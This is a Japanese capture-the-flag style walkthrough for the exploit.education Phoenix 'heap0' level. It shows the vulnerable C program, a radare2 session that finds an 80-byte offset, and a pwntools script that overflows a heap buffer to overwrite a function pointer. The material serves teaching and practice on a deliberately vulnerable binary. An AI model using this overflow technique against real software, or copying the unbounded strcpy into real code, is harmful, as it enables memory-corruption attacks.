---
description: http://exploit.education/phoenix/heap-zero/
---

# heap0

## ソースコード

幸い、ソースコードが与えられています。

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct data {
  char name[64];
};

struct fp {
  void (*fp)();
  char __pad[64 - sizeof(unsigned long)];
};

void winner() {
  printf("Congratulations, you have passed this level\n");
}

void nowinner() {
  printf(
      "level has not been passed - function pointer has not been "
      "overwritten\n");
}

int main(int argc, char **argv) {
  struct data *d;
  struct fp *f;

  if (argc < 2) {
    printf("Please specify an argument to copy :-)\n");
    exit(1);
  }

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  strcpy(d->name, argv[1]);

  printf("data is at %p, fp is at %p, will be calling %p\n", d, f, f->fp);
  fflush(stdout);

  f->fp();

  return 0;
}
```

## 解析

では、何をしているのかを解析しましょう。

* ヒープ上に 2 つのチャンクを確保する
* チャンク `f` の `fp` 変数に `nowinner` のアドレスを設定する
* 最初のコマンドライン引数をチャンク `d` の `name` 変数にコピーする
* `f` の `fp` 変数が指しているものを実行する

弱点は明らかです。ヒープ上の任意のアドレスを実行してしまいます。値が設定された後に入力がコピーされ、しかも境界チェックがまったくないため、簡単に溢れさせることができます。

### 通常の実行

まずは通常の状態でヒープを確認しましょう。

```
$ r2 -d -A heap0 AAAAAAAAAAAA            <== that's just a parameter
$ s main; pdf
[...]
0x0040075d      e8fefdffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
0x00400762      488b45f8       mov rax, qword [var_8h]
[...]
```

strcpy の直後にブレークして、どうなっているか見てみます。

```
[0x004006f8]> db 0x00400762
[0x004006f8]> dc
hit breakpoint at: 0x400762
```

![想定どおりの 2 つのチャンク](<../../../.gitbook/assets/image (5).png>)

必要なら、内容も確認できます。

![入力が入ったチャンク](<../../../.gitbook/assets/image (2) (1) (1).png>)

![関数のアドレスが入ったチャンク](<../../../.gitbook/assets/image (3).png>)

このように、メモリ上では入力の後ろに関数のアドレスがあることが分かります。オフセットを求めましょう。

### オフセットを求める

ポインタに届くまでに何文字必要かを知りたいので、ここでは [De Bruijn シーケンス](../../stack/de-bruijn-sequences.md)(De Bruijn Sequence)を使います。

```
$ ragg2 -P 200 -r
```

```
$ r2 -d -A heap0 AAABAACAADAAE...
```

`strcpy` の**直前**と**直後**でブレークします。こうすると、ポインタの位置を確認してから、すぐにその値を読み取ってオフセットを計算できます。

```
[0x004006f8]> db 0x0040075d
[0x004006f8]> db 0x00400762
[0x004006f8]> dc
hit breakpoint at: 0x40075d
```

![strcpy の前のチャンク](<../../../.gitbook/assets/image (2) (1).png>)

ポインタを持つチャンクは `0x2493060` にあります。次のブレークポイントまで進めましょう。

```
[0x0040075d]> dc
hit breakpoint at: 0x400762
```

![破壊された状態](<../../../.gitbook/assets/image (1) (1).png>)

radare2 は親切にも、データを破壊したことを教えてくれます。もう一度チャンクを解析しましょう。

![](<../../../.gitbook/assets/image (4).png>)

`size` フィールドを上書きしたため、チャンクがはるかに大きくなっていることに注目してください。ただ、先頭の値を使えばオフセットを簡単に求められます(場所が分かっているので、`pxq @ 0x02493060` を使うこともできました)。

```
[0x00400762]> wopO 0x6441416341416241
80
```

というわけで、とても単純です。80 文字の後に `winner` のアドレスを置きます。

## エクスプロイト

```python
from pwn import *

elf = context.binary = ELF('./heap0')

payload = (b'A' * 80 + flat(elf.sym['winner'])).replace(b'\x00', b'')

p = elf.process(argv=[payload])

print(p.clean().decode('latin-1'))
```

{% hint style="info" %}
`argv` にはヌルバイトを含められないため、取り除く必要があります
{% endhint %}
